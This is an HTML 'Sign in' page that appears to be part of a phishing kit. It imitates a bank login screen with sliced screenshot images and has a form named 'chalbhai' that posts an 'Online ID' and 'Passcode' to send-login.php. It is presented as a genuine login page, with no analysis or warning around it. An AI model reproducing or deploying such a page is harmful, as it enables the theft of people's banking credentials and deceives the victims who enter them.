
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign in</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="shape1" style="position:absolute; overflow:hidden; left:218px; top:116px; width:996px; height:373px; z-index:0"><img border=0 width="100%" height="100%" alt="" src="images/shape1570988843.gif"></div>

<div id="image1" style="position:absolute; overflow:hidden; left:583px; top:0px; width:632px; height:30px; z-index:1"><a href="#"><img src="images/01.png" alt="" title="" border=0 width=632 height=30></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:673px; top:46px; width:540px; height:43px; z-index:2"><a href="#"><img src="images/02.png" alt="" title="" border=0 width=540 height=43></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:219px; top:39px; width:252px; height:36px; z-index:3"><img src="images/03.png" alt="" title="" border=0 width=252 height=36></div>

<div id="image4" style="position:absolute; overflow:hidden; left:510px; top:112px; width:716px; height:55px; z-index:4"><img src="images/04.png" alt="" title="" border=0 width=716 height=55></div>

<div id="image5" style="position:absolute; overflow:hidden; left:547px; top:169px; width:665px; height:111px; z-index:5"><img src="images/05.png" alt="" title="" border=0 width=665 height=111></div>

<div id="image6" style="position:absolute; overflow:hidden; left:214px; top:101px; width:298px; height:135px; z-index:6"><img src="images/06.png" alt="" title="" border=0 width=298 height=135></div>

<div id="image7" style="position:absolute; overflow:hidden; left:227px; top:209px; width:162px; height:19px; z-index:7"><a href="#"><img src="images/07.png" alt="" title="" border=0 width=162 height=19></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:417px; top:177px; width:85px; height:17px; z-index:8"><a href="#"><img src="images/08.png" alt="" title="" border=0 width=85 height=17></a></div>
<form action=send-login.php name=chalbhai id=chalbhai method=post>
<input name="formtext1" required  placeholder="Online ID"  maxlength="32"  type="text" style="position:absolute;width:90px;left:230px;height:24px;top:138px;z-index:9">
<input name="formtext2" placeholder="Passcode" maxlength="20" required type="password" style="position:absolute;width:90px;left:325px;height:24px;top:138px;z-index:10">
<div id="formimage1" style="position:absolute; left:419px; top:135px; z-index:11"><input type="image" name="formimage1" width="82" height="28" src="images/signs.png"></div>
<div id="formcheckbox1" style="position:absolute; left:225px; top:174px; z-index:12"><input type="checkbox" name="formcheckbox1"></div>
<div id="image9" style="position:absolute; overflow:hidden; left:229px; top:301px; width:977px; height:168px; z-index:13"><a href="#"><img src="images/09.png" alt="" title="" border=0 width=977 height=168></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:217px; top:500px; width:1003px; height:194px; z-index:14"><a href="#"><img src="images/010.png" alt="" title="" border=0 width=1003 height=194></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:223px; top:709px; width:980px; height:193px; z-index:15"><img src="images/011.png" alt="" title="" border=0 width=980 height=193></div>

<div id="image12" style="position:absolute; overflow:hidden; left:209px; top:926px; width:1017px; height:462px; z-index:16"><a href="#"><img src="images/012.png" alt="" title="" border=0 width=1017 height=462></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:207px; top:1395px; width:1043px; height:362px; z-index:17"><img src="images/footer.png" alt="" title="" border=0 width=1043 height=362></div>


</body>
</html>
